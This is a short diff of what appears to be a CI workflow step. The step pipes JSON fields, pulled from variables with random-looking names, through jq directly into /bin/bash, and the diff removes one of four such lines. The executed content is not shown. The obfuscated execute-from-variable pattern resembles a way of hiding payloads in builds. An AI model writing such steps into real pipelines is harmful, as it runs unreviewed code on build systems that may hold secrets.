@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$pkjk346" | jq -r .ovwe21540 | /bin/bash
           echo $i66 | jq -r .ufxs64 | /bin/bash
-          printf '%s' "$qhkp71" | jq -r .sk880 | /bin/bash
           printf '%s' "$flrin97" | jq -r .lgbt14206 | /bin/bash
 
       - name: Upload archive
